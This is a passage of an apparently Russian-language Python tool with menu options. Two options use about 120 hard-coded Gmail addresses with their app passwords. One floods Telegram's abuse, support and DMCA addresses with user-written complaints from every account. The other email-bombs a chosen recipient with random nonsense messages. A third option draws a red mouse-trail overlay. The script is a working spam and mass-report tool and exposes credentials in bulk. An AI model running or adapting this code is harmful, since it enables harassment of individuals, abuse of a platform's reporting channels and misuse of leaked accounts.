            "segatel093@gmail.com": "fsma qetz gvmp pqrm",
            "irina15815123@gmail.com": "fmre mxne ncaw gnke",
            "germanalexandrovich12345678@gmail.com": "tsln hvmz mipp kmwh",
            "bl89222099674@gmail.com": "yjru yftj zihu nyrz",
            "psega0892@gmail.com": "vhrr hiso npgm xnoi",
            "noakk1843@gmail.com": "mvqo rfrv cjht vppo",
            "tatanamorinskaa@gmail.com": "cjig kaxt tijl ndre",
            "ivanplutalov543@gmail.com": "xsvm ewki dhfz qqkh",
            "editt1345@gmail.com": "hezf xuel hzvz jzur",
            "dlatt7055@gmail.com": "tpzd nxle odaw uqwf",
            "dlyabravla655@gmail.com": "kprn ihvr bgia vdys",
            "allisonikse1922@gmail.com": "tozo xrzu qndn mwuq",
            "Ivan27727272hwhs@gmail.com": "ozcu edfd gmgk rkqg",
            "Sckykatwo@gmail.com": "dblx ajll ugku ogpx",
            "d77666742@gmail.com": "alze kfmx xaem jogm",
            "deg411025@gmail.com": "pccl aleu earc aewn",
            "spamemailfree1@gmail.com": "uzvr iykl eiab rvqm",
            "sczdsv@gmail.com": "sdjt wbbr mglv obil",
            "osutokudu06@gmail.com": "gscs ztmn suqx nnsb",
            "ezezeludaz27@gmail.com": "ofxg arpz brcd pyip",
            "pidraslox@gmail.com": "bqgb bfow uxgm sgtq",
            "cnkstraz@gmail.com": "zcpe hdbi ujao bron",
            "ofag59111@gmail.com": "xmnx ijya yxvr wamo",
            "snossigma@gmail.com": "tozk zdns btfc osfw",
            "snosdark@gmail.com": "yajs rvin aqsw btfv",
            "34pashagei228@gmail.com": "xctb krbh xhpq rzae",
            "pashageimazahist@gmail.com": "edzp fxeq dkww wyyc",
            "snosertg@gmail.com": "xlvl yckq xxpd cidh",
            "krabiksigma7@gmail.com": "kpkh jyzz zifi umxe",
            "andraser93@gmail.com": "jftf eqdt tbdo chxh",
            "artistzxkakk@gmail.com": "hpxg zmti cwlx svar",
            "nazarkoksov@gmail.com": "hgoh bpmu gdbj qnho",
            "v89740130@gmail.com": "wzrg rgxb ddqx fidp",
            "jshevdydiwnww@gmail.com": "olfc uhan drkz lptn",
            "xneokskurator@gmail.com": "okpj fuir hogn tszy",
            "nikitaefremovvv1@gmail.com": "rruo rdhr ffdo ccum",
            "vasyapetkin132@gmail.com": "bflk peqq sorn gfsp",
            "genadijklimak@gmail.com": "tbvu xdiw ppuv bqbp",
            "annnoraleidingbr57@gmail.com": "desnidcbrzkekuby",
            "wendyechanonatxd@gmail.com": "xiijwnggabwljwpp",
            "tsimshianhoming@gmail.com": "uztratzommnsjnqs",
            "rokmomnoncnm@gmail.com": "lgxrqtglkpulfupn",
            "sharonmenascer@gmail.com": "yupfvclgvyrrkyzt",
            "missieletulled128@gmail.com": "mnymjjfjxaxyomrn",
            "brenaurquhar834@gmail.com": "bhcfucpdqinujzzm",
            "bondingboasew@gmail.com": "ikgtyjtkjkehmjsi",
            "oyevajug91@gmail.com": "ziea dntc riuc czhs",
            "wuxojonoz52@gmail.com": "tqdj hecd vbsv gszz",
            "uhiduma149@gmail.com": "sunx dnsc djej qgfn",
            "ozoloko523@gmail.com": "qnek owrj oplx nxwg",
            "erotexen89@gmail.com": "ruzj ydkt erfz mkhy",
            "wovonunepo107@gmail.com": "twxe takt blju zvjt",
            "oficuhu591@gmail.com": "lrtb gjiz tawx qtse",
            "aqenufujeba21@gmail.com": "lplu btvj eknu blyx",
            "awobayucel368@gmail.com": "gbfm kgso aslb vsmi",
            "ufajiyuy96@gmail.com": "bzek kkwf bjwe avxi",
            "m70013953@gmail.com": "lyfmhqcoxdajfubq",
            "alivalijonovich5@gmail.com": "fnyboinhhsbddkqo",
            "magauor05@gmail.com": "zzifsqvahkgrkivv",
            "darenhanfyniag@gmail.com": "lvjy kywf aofa dmjp",
            "goudysrinivasmewhr@gmail.com": "iyuz tylx nmnl fzgm",
            "sureshkaylorqvmf@gmail.com": "kgru juxz cbre ryqz",
            "popaseveloqqpmn@gmail.com": "kuba heor kkev vtnd",
            "rajheemxiongojpheu@gmail.com": "bate xeih akxr xopx",
            "yefrieliminatorfepsg@gmail.com": "soyf xzdf ijda uonv",
            "muecasfalcaorzbqd@gmail.com": "mqbf vnjc qhgb lzaj",
            "storrsisyansdy@gmail.com": "zuiy ppmz isar gjui",
            "jeffersastudillomalmkx@gmail.com": "itsm ywxt jowf bvsh",
            "moisesmarxmillerprtoym@gmail.com": "bzim qbxg atdl mvqz",
            "edmondsjeffersxjn@gmail.com": "vidc jfhp peky zjwr",
            "funderburgadelsongsog@gmail.com": "qoaz adec guxp rhxr",
            "tuasonbasilkqubx@gmail.com": "ntpo fomp pjbj wlon",
            "richardsoncrownvbskc@gmail.com": "kyqg ymvs qiku zsjt",
            "changibrahimafumcsv@gmail.com": "yaoz jngg zzzi qfnc",
            "pewittvinceoobxe@gmail.com": "xwxn uxod tdiq ltxv",
            "chpnepalstunr@gmail.com": "wfue rqta amlt ypfl",
            "piersonpremujiavy@gmail.com": "balu rlwc uucn rtvl",
            "tregoningantonyubhfup@gmail.com": "kuzq ozqm spjh ewsu",
            "marlohabbanifnkvu@gmail.com": "kalh brnn koln sfbp",
            "horowitzprinceglksr@gmail.com": "rvav kfxw nvdq jepl",
            "capersshawnkfvig@gmail.com": "ssmw vbnj uczh lvlo",
            "schroetersakurafbpe@gmail.com": "zgze gmrh lpoa ecbx",
            "weaverebukagvsgye@gmail.com": "elkg lnuc nruv pulg",
            "nevorovatt2@gmail.com": "rrtj gafh wchj rkhb",
            "xxhowsq@gmail.com": "fcmm adeq oato gjon",
            "cotiktyn@gmail.com": "rhko oxey zpio nmsr",
            "arinacringe@gmail.com": "jkwa ewdm vjpe mgxo",
            "vinnieflood0@gmail.com": "blpx uyyk izjt bihj",
            "specevoid@gmail.com": "zgiz ebkz lgld ohxe"
        }

        receivers = ['abuse@telegram.org', 'support@telegram.org', 'dmca@telegram.org']

        async def send_email_async(msg_number, total_msgs, sender_email, sender_password, receiver, subject, body):
            server = None
            try:
                msg = MIMEMultipart()
                msg['From'] = sender_email
                msg['To'] = receiver
                msg['Subject'] = subject
                msg.attach(MIMEText(body, 'plain'))

                smtp_server = 'smtp.gmail.com'
                smtp_port = 587

                print(f"[{msg_number}/{total_msgs}] Подключение к серверу...")
                server = smtplib.SMTP(smtp_server, smtp_port)
                server.starttls()

                print(f"[{msg_number}/{total_msgs}] Авторизация {sender_email}...")
                server.login(sender_email, sender_password)

                print(f"[{msg_number}/{total_msgs}] Отправка письма...")
                server.send_message(msg)
                print(f"[{msg_number}/{total_msgs}] Успешно отправлено с {sender_email} на {receiver}")
                return True

            except smtplib.SMTPAuthenticationError:
                print(f"[{msg_number}/{total_msgs}] Ошибка аутентификации для {sender_email}")
                return False
            except Exception as e:
                print(f"[{msg_number}/{total_msgs}] Ошибка при отправке: {str(e)}")
                return False
            finally:
                if server:
                    try:
                        server.quit()
                    except:
                        pass

        async def main_async():
            print("Введите тему письма:")
            subject = input().strip()

            print("\nВведите текст письма:")
            print("------------------------")
            body_lines = []
            while True:
                line = input()
                if line.strip().upper() == '':
                    break
                body_lines.append(line)

            body = '\n'.join(body_lines)

            print("\nПодготовка к отправке...")
            print("------------------------")
            print(f"Тема: {subject}")
            print(f"Текст:\n{body}")
            print("------------------------")
            print("Начинаем отправку...\n")

            total_msgs = len(senders) * len(receivers)
            msg_number = 0
            results = []

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    msg_number += 1
                    result = await send_email_async(
                        msg_number,
                        total_msgs,
                        sender_email,
                        sender_password,
                        receiver,
                        subject,
                        body
                    )
                    results.append(result)

            print("\n------------------------")
            successful = sum(1 for r in results if r)
            failed = len(results) - successful
            print(f"Всего отправлено: {successful}")
            if failed > 0:
                print(f"Не удалось отправить: {failed}")
            print("------------------------")

        def main():
            asyncio.run(main_async())

        if __name__ == "__main__":
            main()
        return False

    elif choice == "6":
        import asyncio
        import random
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        senders = {
            'miranovseverov@gmail.com': ' kdbc vmdb djxf pmiq',
            'maksimafanacefish@gmail.com': 'hdpn tbfp acwv jyro',
            'artemkrotisov@gmail.com': 'zglw vgak tfov uxao',
            'Vanakrotisov@gmail.com': 'gukl qhxy uxea yhil',
            'leravladimir237@gmail.com': 'ndon fzio vskk bidt ',
            'suckdick12345222@gmail.com': 'ckcw eqdv nsjv whgm',
            'alenaveterov@gmail.com': 'hmiq xwmr yfmw prsa',
            'linadurov@gmail.com': 'gsbp xyts brbu dlpw',
            'kolyaivanov000k@gmail.com': 'mfhg eeio ayau zked',
            "dlatt6677@gmail.com": "usun ruef otzx zcrh",
            "edittendo0@gmail.com": "mzdl lrmx puyq epur",
            "shshsbsbsbwbwvw@gmail.com": "jqrx qivo qxjy jejt",
            "IvanKarma2000@gmail.com": "irlr cggo xksq tlbb",
            "misha28272727@gmail.com": "kgwqxvkgjyccibkm",
            "trevorzxasuniga214@gmail.com": "egnr eucw jvxg jatq",
            "dellapreston50@gmail.com": "qoit huon rzsd eewo",
            "neilfdhioley765@gmail.com": "rgco uwiy qrdc gvqh",
            "samuelmnjassey32@gmail.com": "lgct cjiw nufr zxjg",
            "segapro72@gmail.com": "ubmq pbrt ujqy orhf",
            "kurokopotok@gmail.com": "pxww ewut uffz ufpu",
            "kalievutub@gmail.com": "jlwb otxo mppi jvdh",
            "snosakka07@gmail.com": "yiro khva gafc lujr",
            "prosega211@gmail.com": "fnrz rkrp nrwy yaig",
            "qwaerlarp@gmail.com": "zrzx siyf ukvm ctjp",
            "segatel093@gmail.com": "fsma qetz gvmp pqrm",
            "irina15815123@gmail.com": "fmre mxne ncaw gnke",
            "germanalexandrovich12345678@gmail.com": "tsln hvmz mipp kmwh",
            "bl89222099674@gmail.com": "yjru yftj zihu nyrz",
            "psega0892@gmail.com": "vhrr hiso npgm xnoi",
            "noakk1843@gmail.com": "mvqo rfrv cjht vppo",
            "tatanamorinskaa@gmail.com": "cjig kaxt tijl ndre",
            "ivanplutalov543@gmail.com": "xsvm ewki dhfz qqkh",
            "editt1345@gmail.com": "hezf xuel hzvz jzur",
            "dlatt7055@gmail.com": "tpzd nxle odaw uqwf",
            "dlyabravla655@gmail.com": "kprn ihvr bgia vdys",
            "allisonikse1922@gmail.com": "tozo xrzu qndn mwuq",
            "Ivan27727272hwhs@gmail.com": "ozcu edfd gmgk rkqg",
            "Sckykatwo@gmail.com": "dblx ajll ugku ogpx",
            "d77666742@gmail.com": "alze kfmx xaem jogm",
            "deg411025@gmail.com": "pccl aleu earc aewn",
            "spamemailfree1@gmail.com": "uzvr iykl eiab rvqm",
            "sczdsv@gmail.com": "sdjt wbbr mglv obil",
            "osutokudu06@gmail.com": "gscs ztmn suqx nnsb",
            "ezezeludaz27@gmail.com": "ofxg arpz brcd pyip",
            "pidraslox@gmail.com": "bqgb bfow uxgm sgtq",
            "cnkstraz@gmail.com": "zcpe hdbi ujao bron",
            "ofag59111@gmail.com": "xmnx ijya yxvr wamo",
            "snossigma@gmail.com": "tozk zdns btfc osfw",
            "snosdark@gmail.com": "yajs rvin aqsw btfv",
            "34pashagei228@gmail.com": "xctb krbh xhpq rzae",
            "pashageimazahist@gmail.com": "edzp fxeq dkww wyyc",
            "snosertg@gmail.com": "xlvl yckq xxpd cidh",
            "krabiksigma7@gmail.com": "kpkh jyzz zifi umxe",
            "andraser93@gmail.com": "jftf eqdt tbdo chxh",
            "artistzxkakk@gmail.com": "hpxg zmti cwlx svar",
            "nazarkoksov@gmail.com": "hgoh bpmu gdbj qnho",
            "v89740130@gmail.com": "wzrg rgxb ddqx fidp",
            "jshevdydiwnww@gmail.com": "olfc uhan drkz lptn",
            "xneokskurator@gmail.com": "okpj fuir hogn tszy",
            "nikitaefremovvv1@gmail.com": "rruo rdhr ffdo ccum",
            "vasyapetkin132@gmail.com": "bflk peqq sorn gfsp",
            "genadijklimak@gmail.com": "tbvu xdiw ppuv bqbp",
            "annnoraleidingbr57@gmail.com": "desnidcbrzkekuby",
            "wendyechanonatxd@gmail.com": "xiijwnggabwljwpp",
            "tsimshianhoming@gmail.com": "uztratzommnsjnqs",
            "rokmomnoncnm@gmail.com": "lgxrqtglkpulfupn",
            "sharonmenascer@gmail.com": "yupfvclgvyrrkyzt",
            "missieletulled128@gmail.com": "mnymjjfjxaxyomrn",
            "brenaurquhar834@gmail.com": "bhcfucpdqinujzzm",
            "bondingboasew@gmail.com": "ikgtyjtkjkehmjsi",
            "oyevajug91@gmail.com": "ziea dntc riuc czhs",
            "wuxojonoz52@gmail.com": "tqdj hecd vbsv gszz",
            "uhiduma149@gmail.com": "sunx dnsc djej qgfn",
            "ozoloko523@gmail.com": "qnek owrj oplx nxwg",
            "erotexen89@gmail.com": "ruzj ydkt erfz mkhy",
            "wovonunepo107@gmail.com": "twxe takt blju zvjt",
            "oficuhu591@gmail.com": "lrtb gjiz tawx qtse",
            "aqenufujeba21@gmail.com": "lplu btvj eknu blyx",
            "awobayucel368@gmail.com": "gbfm kgso aslb vsmi",
            "ufajiyuy96@gmail.com": "bzek kkwf bjwe avxi",
            "m70013953@gmail.com": "lyfmhqcoxdajfubq",
            "alivalijonovich5@gmail.com": "fnyboinhhsbddkqo",
            "magauor05@gmail.com": "zzifsqvahkgrkivv",
            "darenhanfyniag@gmail.com": "lvjy kywf aofa dmjp",
            "goudysrinivasmewhr@gmail.com": "iyuz tylx nmnl fzgm",
            "sureshkaylorqvmf@gmail.com": "kgru juxz cbre ryqz",
            "popaseveloqqpmn@gmail.com": "kuba heor kkev vtnd",
            "rajheemxiongojpheu@gmail.com": "bate xeih akxr xopx",
            "yefrieliminatorfepsg@gmail.com": "soyf xzdf ijda uonv",
            "muecasfalcaorzbqd@gmail.com": "mqbf vnjc qhgb lzaj",
            "storrsisyansdy@gmail.com": "zuiy ppmz isar gjui",
            "jeffersastudillomalmkx@gmail.com": "itsm ywxt jowf bvsh",
            "moisesmarxmillerprtoym@gmail.com": "bzim qbxg atdl mvqz",
            "edmondsjeffersxjn@gmail.com": "vidc jfhp peky zjwr",
            "funderburgadelsongsog@gmail.com": "qoaz adec guxp rhxr",
            "tuasonbasilkqubx@gmail.com": "ntpo fomp pjbj wlon",
            "richardsoncrownvbskc@gmail.com": "kyqg ymvs qiku zsjt",
            "changibrahimafumcsv@gmail.com": "yaoz jngg zzzi qfnc",
            "pewittvinceoobxe@gmail.com": "xwxn uxod tdiq ltxv",
            "chpnepalstunr@gmail.com": "wfue rqta amlt ypfl",
            "piersonpremujiavy@gmail.com": "balu rlwc uucn rtvl",
            "tregoningantonyubhfup@gmail.com": "kuzq ozqm spjh ewsu",
            "marlohabbanifnkvu@gmail.com": "kalh brnn koln sfbp",
            "horowitzprinceglksr@gmail.com": "rvav kfxw nvdq jepl",
            "capersshawnkfvig@gmail.com": "ssmw vbnj uczh lvlo",
            "schroetersakurafbpe@gmail.com": "zgze gmrh lpoa ecbx",
            "weaverebukagvsgye@gmail.com": "elkg lnuc nruv pulg",
            "nevorovatt2@gmail.com": "rrtj gafh wchj rkhb",
            "xxhowsq@gmail.com": "fcmm adeq oato gjon",
            "cotiktyn@gmail.com": "rhko oxey zpio nmsr",
            "arinacringe@gmail.com": "jkwa ewdm vjpe mgxo",
            "vinnieflood0@gmail.com": "blpx uyyk izjt bihj",
            "specevoid@gmail.com": "zgiz ebkz lgld ohxe"
        }

        subjects = [
            "Прочти меня",
            "Бинзин",
            "Жалоба",
            "ХУЙ",
            "не аткрывай мина",
            "НЭЭД",
            "Venom",
            "Привет",
            "Очень срочно!",
        ]

        bodies = [
            "ЫЫЫ я погладил собаку, а она превратилась в диван и начала рассказывать анекдоты",

            "ААА я решил полететь на Луну, но забыл, что Луна — это сыр, и теперь я в мышеловке",

            "УУУ я нарисовал картину, а она ожила и начала есть мои носки",

            "ООО я пошел в лес, а лес пошел за мной, и теперь мы вместе смотрим сериалы",

            "ЫЫЫ я купил чайник, а он начал петь оперу и улетел в космос",

            "ЫЫЫ я решил стать бананом, но забыл, что бананы не умеют играть в шахматы",

            "ААА я пошел в школу, а школа сказала, что она сегодня не учится, и ушла домой",

            "УУУ я поймал рыбу, а рыба поймала меня, и теперь мы вместе снимаемся в рекламе",

            "ООО я нашел ключ, а ключ открыл меня, и теперь я дверь",

            "ЫЫЫ я решил стать звездой, но звезда сказала, что она уже занята, и я стал астероидом",

            "ААА я пошел в кино, а кино пошло за мной, и теперь мы вместе едим попкорн",

            "УУУ я погладил кота, а кот стал моим начальником и повысил мне зарплату",

            "ООО я решил стать книгой, но книга сказала, что она уже прочитана, и я стал закладкой",

            "ЫЫЫ я пошел в магазин за молоком, а молоко купило меня, и теперь я живу в холодильнике",

            "ААА я решил стать облаком, но облако сказало, что оно уже дождь, и я стал лужей",

            "УУУ я поймал мяч, а мяч поймал меня, и теперь мы вместе играем в прятки",

            "ООО я решил стать деревом, но дерево сказало, что оно уже стол, и я стал табуреткой",

            "ЫЫЫ я пошел в парк, а парк пошел за мной, и теперь мы вместе катаемся на качелях",

            "ААА я решил стать рекой, но река сказала, что она уже море, и я стал волной",

            "УУУ я погладил пингвина, а он стал моим лучшим другом и научил меня танцевать",

            "ООО я решил стать звездой, но звезда сказала, что она уже планета, и я стал спутником",

            "ЫЫЫ я пошел в кафе, а кафе пошло за мной, и теперь мы вместе пьем кофе",

            "ААА я решил стать книгой, но книга сказала, что она уже фильм, и я стал сценарием",

            "УУУ я поймал бабочку, а бабочка поймала меня, и теперь мы вместе летаем",

            "ООО я решил стать горой, но гора сказала, что она уже вулкан, и я стал лавой",

            "ЫЫЫ я пошел в библиотеку, а библиотека пошла за мной, и теперь мы вместе читаем",

            "ААА я решил стать облаком, но облако сказало, что оно уже туман, и я стал росой",

            "УУУ я погладил ежа, а он стал моим учителем и научил меня математике",

            "ООО я решил стать рекой, но река сказала, что она уже озеро, и я стал рыбкой",

            "ЫЫЫ я пошел в кинотеатр, а кинотеатр пошел за мной, и теперь мы вместе смотрим фильмы",

            "ААА я решил стать звездой, но звезда сказала, что она уже комета, и я стал хвостом",

            "УУУ я поймал снежинку, а снежинка поймала меня, и теперь мы вместе таем",

            "ООО я решил стать деревом, но дерево сказало, что оно уже лес, и я стал грибом",

            "ЫЫЫ я пошел в магазин за хлебом, а хлеб купил меня, и теперь я живу в буханке",

            "ААА я решил стать облаком, но облако сказало, что оно уже радуга, и я стал цветом",

            "УУУ я погладил медведя, а он стал моим другом и научил меня рычать",

            "ООО я решил стать горой, но гора сказала, что она уже долина, и я стал цветком",

            "ЫЫЫ я пошел в парк, а парк пошел за мной, и теперь мы вместе кормим уток",

            "ААА я решил стать книгой, но книга сказала, что она уже библиотека, и я стал полкой",

            "УУУ я поймал рыбку, а рыбка поймала меня, и теперь мы вместе плаваем",

            "ООО я решил стать звездой, но звезда сказала, что она уже созвездие, и я стал частью",

            "ЫЫЫ я пошел в кафе, а кафе пошло за мной, и теперь мы вместе едим пирожные",

            "ААА я решил стать облаком, но облако сказало, что оно уже гроза, и я стал молнией",

            "УУУ я погладил слона, а он стал моим другом и научил меня трубить",

            "ООО я решил стать рекой, но река сказала, что она уже водопад, и я стал каплей",

            "ЫЫЫ я пошел в кино, а кино пошло за мной, и теперь мы вместе смотрим мультики",

            "ААА я решил стать книгой, но книга сказала, что она уже энциклопедия, и я стал страницей",

            "УУУ я поймал бабочку, а бабочка поймала меня, и теперь мы вместе порхаем",

            "ООО я решил стать горой, но гора сказала, что она уже пещера, и я стал сталактитом",

            "ЫЫЫ я пошел в магазин за молоком, а молоко купило меня, и теперь я живу в пакете",
            "ЫЫЫ я решил стать звездой, но звезда сказала, что она уже черная дыра, и я стал пространством",

            "ААА я пошел в лес, а лес сказал, что он сегодня не работает, и я стал муравьем",

            "УУУ я погладил жирафа, а он стал моим другом и научил меня тянуться к облакам",

            "ООО я решил стать рекой, но река сказала, что она уже океан, и я стал волной",

            "ЫЫЫ я пошел в магазин за яйцами, а яйца купили меня, и теперь я живу в коробке",

            "ААА я решил стать книгой, но книга сказала, что она уже комикс, и я стал пузырем с текстом",

            "УУУ я поймал бабочку, а бабочка поймала меня, и теперь мы вместе рисуем радугу",

            "ООО я решил стать деревом, но дерево сказало, что оно уже парк, и я стал скамейкой",

            "ЫЫЫ я пошел в кафе, а кафе пошло за мной, и теперь мы вместе едим пиццу",

            "ААА я решил стать облаком, но облако сказало, что оно уже туча, и я стал дождем",

            "УУУ я погладил панду, а она стала моим другом и научила меня есть бамбук",

            "ООО я решил стать горой, но гора сказала, что она уже холм, и я стал травинкой",

            "ЫЫЫ я пошел в кино, а кино пошло за мной, и теперь мы вместе смотрим триллеры",

            "ААА я решил стать книгой, но книга сказала, что она уже аудиокнига, и я стал голосом",

            "УУУ я поймал рыбку, а рыбка поймала меня, и теперь мы вместе ныряем",

            "ООО я решил стать звездой, но звезда сказала, что она уже метеорит, и я стал искрой",

            "ЫЫЫ я пошел в магазин за молоком, а молоко купило меня, и теперь я живу в стакане",

            "ААА я решил стать облаком, но облако сказало, что оно уже радуга, и я стал цветом",

            "УУУ я погладил слона, а он стал моим другом и научил меня ходить тихо",

            "ООО я решил стать рекой, но река сказала, что она уже ручей, и я стал камушком",

            "ЫЫЫ я пошел в парк, а парк пошел за мной, и теперь мы вместе кормим голубей",

            "ААА я решил стать книгой, но книга сказала, что она уже журнал, и я стал страницей",

            "УУУ я поймал бабочку, а бабочка поймала меня, и теперь мы вместе летаем",

            "ООО я решил стать горой, но гора сказала, что она уже долина, и я стал цветком",

            "ЫЫЫ я пошел в кафе, а кафе пошло за мной, и теперь мы вместе пьем чай",

            "ААА я решил стать облаком, но облако сказало, что оно уже туман, и я стал каплей",

            "УУУ я погладил медведя, а он стал моим другом и научил меня рычать",

            "ООО я решил стать звездой, но звезда сказала, что она уже планета, и я стал спутником",

            "ЫЫЫ я пошел в магазин за хлебом, а хлеб купил меня, и теперь я живу в буханке",

            "ААА я решил стать книгой, но книга сказала, что она уже фильм, и я стал сценарием",

            "УУУ я поймал рыбку, а рыбка поймала меня, и теперь мы вместе плаваем",

            "ООО я решил стать деревом, но дерево сказало, что оно уже лес, и я стал грибом",

            "ЫЫЫ я пошел в кинотеатр, а кинотеатр пошел за мной, и теперь мы вместе смотрим фильмы",

            "ААА я решил стать облаком, но облако сказало, что оно уже радуга, и я стал цветом",

            "УУУ я погладил пингвина, а он стал моим другом и научил меня кататься на льду",

            "ООО я решил стать горой, но гора сказала, что она уже вулкан, и я стал лавой",

            "ЫЫЫ я пошел в библиотеку, а библиотека пошла за мной, и теперь мы вместе читаем",

            "ААА я решил стать книгой, но книга сказала, что она уже энциклопедия, и я стал страницей",

            "УУУ я поймал снежинку, а снежинка поймала меня, и теперь мы вместе таем",

            "ООО я решил стать рекой, но река сказала, что она уже озеро, и я стал рыбкой",

            "ЫЫЫ я пошел в парк, а парк пошел за мной, и теперь мы вместе катаемся на качелях",

            "ААА я решил стать звездой, но звезда сказала, что она уже комета, и я стал хвостом",

            "УУУ я погладил кота, а кот стал моим другом и научил меня спать весь день",

            "ООО я решил стать деревом, но дерево сказало, что оно уже стол, и я стал табуреткой",

            "ЫЫЫ я пошел в магазин за молоком, а молоко купило меня, и теперь я живу в холодильнике",

            "ААА я решил стать облаком, но облако сказало, что оно уже дождь, и я стал лужей",

            "УУУ я поймал мяч, а мяч поймал меня, и теперь мы вместе играем в прятки",

            "ООО я решил стать книгой, но книга сказала, что она уже закладка, и я стал страницей",

            "ЫЫЫ я пошел в кафе, а кафе пошло за мной, и теперь мы вместе едим пирожные",

            "ААА я решил стать звездой, но звезда сказала, что она уже созвездие, и я стал частью"
        ]

        async def send_email_async(msg_number, total_msgs, sender_email, sender_password, receiver, subject, body):
            server = None
            try:
                msg = MIMEMultipart()
                msg['From'] = sender_email
                msg['To'] = receiver
                msg['Subject'] = subject
                msg.attach(MIMEText(body, 'plain'))

                smtp_server = 'smtp.gmail.com'
                smtp_port = 587

                print(f"[{msg_number}/{total_msgs}] Подключение к серверу...")
                server = smtplib.SMTP(smtp_server, smtp_port)
                server.starttls()

                print(f"[{msg_number}/{total_msgs}] Авторизация {sender_email}...")
                server.login(sender_email, sender_password)

                print(f"[{msg_number}/{total_msgs}] Отправка письма...")
                server.send_message(msg)
                print(f"[{msg_number}/{total_msgs}] Успешно отправлено с {sender_email} на {receiver}")
                return True

            except smtplib.SMTPAuthenticationError:
                print(f"[{msg_number}/{total_msgs}] Ошибка аутентификации для {sender_email}")
                return False
            except Exception as e:
                print(f"[{msg_number}/{total_msgs}] Ошибка при отправке: {str(e)}")
                return False
            finally:
                if server:
                    try:
                        server.quit()
                    except:
                        pass

        async def main_async():
            print("Введите email получателя:")
            receiver = input().strip()

            print("\nПодготовка к отправке...")
            print("------------------------")

            total_msgs = len(senders)
            msg_number = 0
            results = []

            for sender_email, sender_password in senders.items():
                msg_number += 1
                subject = random.choice(subjects)
                body = random.choice(bodies)

                result = await send_email_async(
                    msg_number,
                    total_msgs,
                    sender_email,
                    sender_password,
                    receiver,
                    subject,
                    body
                )
                results.append(result)

            print("\n------------------------")
            successful = sum(1 for r in results if r)
            failed = len(results) - successful
            print(f"Всего отправлено: {successful}")
            if failed > 0:
                print(f"Не удалось отправить: {failed}")
            print("------------------------")

        def main():
            asyncio.run(main_async())

        if __name__ == "__main__":
            main()

    elif choice == "7":
        import sys
        from PyQt6.QtWidgets import QApplication, QWidget
        from PyQt6.QtCore import Qt, QPoint, QTimer
        from PyQt6.QtGui import QPainter, QColor
        import mouse
        import time
        import threading
        import os
        from typing import Optional, List
        from dataclasses import dataclass

        @dataclass
        class Rectangle:
            pos: QPoint
            opacity: float
            creation_time: float
            fade_start: Optional[float] = None

        class SelectionWindow(QWidget):
            def __init__(self) -> None:
                super().__init__()
                self.rectangles: List[Rectangle] = []
                self.is_active: bool = True
                self.fade_duration: float = 1.0
                self.mouse_idle_timeout: float = 0.5
                self.last_mouse_move_time: float = time.time()
                self.initUI()
                self.start_keyboard_listener()

            def initUI(self) -> None:
                self.setWindowFlags(
                    Qt.WindowType.FramelessWindowHint |
                    Qt.WindowType.WindowStaysOnTopHint |
                    Qt.WindowType.Tool |
                    Qt.WindowType.WindowTransparentForInput |
                    Qt.WindowType.WindowDoesNotAcceptFocus |
                    Qt.WindowType.BypassWindowManagerHint |
                    Qt.WindowType.SubWindow
                )

                self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
                self.setAttribute(Qt.WidgetAttribute.WA_ShowWithoutActivating)
                self.setAttribute(Qt.WidgetAttribute.WA_AlwaysStackOnTop)
                self.setAttribute(Qt.WidgetAttribute.WA_X11NetWmWindowTypeDesktop)

                screen = QApplication.primaryScreen()
                self.setGeometry(screen.availableGeometry())
                self.setStyleSheet("background: transparent;")

                self.last_pos = None
                self.last_rect_time = time.time()
                self.rect_interval = 0.005

                self.setup_timers()
                self.show()
                self.raise_()
                self.activateWindow()

            def setup_timers(self) -> None:
                self.top_timer = QTimer()
                self.top_timer.timeout.connect(self.ensure_on_top)
                self.top_timer.start(50)

                self.fade_timer = QTimer()
                self.fade_timer.timeout.connect(self.fade_rectangles)
                self.fade_timer.start(16)

                self.draw_timer = QTimer()
                self.draw_timer.timeout.connect(self.update_drawing)
                self.draw_timer.start(1)

                self.idle_check_timer = QTimer()
                self.idle_check_timer.timeout.connect(self.check_mouse_idle)
                self.idle_check_timer.start(100)

            def start_keyboard_listener(self) -> None:
                def keyboard_listener() -> None:
                    while True:
                        try:
                            print("Введите 1 для отключения ауры")
                            user_input = input()
                            if user_input == "1":
                                os._exit(0)
                        except EOFError:
                            break

                thread = threading.Thread(target=keyboard_listener, daemon=True)
                thread.start()

            def check_mouse_idle(self) -> None:
                current_pos = mouse.get_position()
                current_time = time.time()

                if self.last_pos and current_pos == self.last_pos:
                    if current_time - self.last_mouse_move_time > self.mouse_idle_timeout:
                        self.start_fade()
                else:
                    self.last_mouse_move_time = current_time
                    for rect in self.rectangles:
                        rect.fade_start = None

            def start_fade(self) -> None:
                current_time = time.time()
                for rect in self.rectangles:
                    if rect.fade_start is None:
                        rect.fade_start = current_time

            def update_drawing(self) -> None:
                current_time = time.time()
                current_pos = mouse.get_position()

                if self.last_pos is None or current_pos != self.last_pos:
                    if current_time - self.last_rect_time >= self.rect_interval:
                        self.rectangles.append(Rectangle(
                            pos=QPoint(current_pos[0], current_pos[1]),
                            opacity=1.0,
                            creation_time=current_time
                        ))
                        self.last_rect_time = current_time
                        self.update()
                    self.last_pos = current_pos

            def fade_rectangles(self) -> None:
                current_time = time.time()
                need_update = False

                for rect in self.rectangles:
                    if rect.fade_start is not None:
                        fade_progress = (current_time - rect.fade_start) / self.fade_duration
                        rect.opacity = max(0, 1.0 - fade_progress)
                        need_update = True

                self.rectangles = [rect for rect in self.rectangles if rect.opacity > 0]

                if need_update:
                    self.update()

            def ensure_on_top(self) -> None:
                self.raise_()
                self.activateWindow()

            def paintEvent(self, event) -> None:
                if self.rectangles:
                    painter = QPainter(self)
                    painter.setRenderHint(QPainter.RenderHint.Antialiasing)

                    for rect in self.rectangles:
                        fill_color = QColor(255, 0, 0)
                        fill_color.setAlphaF(rect.opacity)

                        border_color = QColor(200, 0, 0)
                        border_color.setAlphaF(min(rect.opacity + 0.3, 1.0))

                        pos = rect.pos
                        width = 50
                        height = 50

                        painter.fillRect(pos.x() - width // 2, pos.y() - height // 2, width, height, fill_color)
                        painter.setPen(border_color)
                        for i in range(2):
                            painter.drawRect(
                                pos.x() - width // 2 + i,
                                pos.y() - height // 2 + i,
                                width - 2 * i,
                                height - 2 * i
                            )

            def keyPressEvent(self, event) -> None:
                if event.key() == Qt.Key.Key_Escape:
                    os._exit(0)

        if __name__ == '__main__':
            app = QApplication(sys.argv)
